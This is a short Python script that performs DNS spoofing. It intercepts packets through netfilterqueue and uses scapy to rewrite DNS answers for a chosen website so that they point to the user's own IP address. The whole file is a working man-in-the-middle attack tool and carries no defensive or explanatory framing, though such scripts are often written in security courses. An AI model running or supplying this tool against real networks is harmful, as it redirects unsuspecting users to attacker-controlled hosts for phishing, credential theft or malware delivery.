import optparse
import netfilterqueue
import scapy.all as scapy


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--ip", dest="ip", help="Your IP")
    parser.add_option("-w", "--website", dest="web_site", help="Web site that you want to spoof")
    arguments = parser.parse_args()[0]

    if not arguments.ip:
        parser.error("[-] Set your IP, use -h for more info")
    if not arguments.web_site:
        parser.error("[-] Set web site, use -h for more info")
    return arguments


def process_packet(packet):
    arguments = get_arguments()
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if arguments.web_site in qname:
            answer = scapy.DNSRR(rrname=qname, rdata=arguments.ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

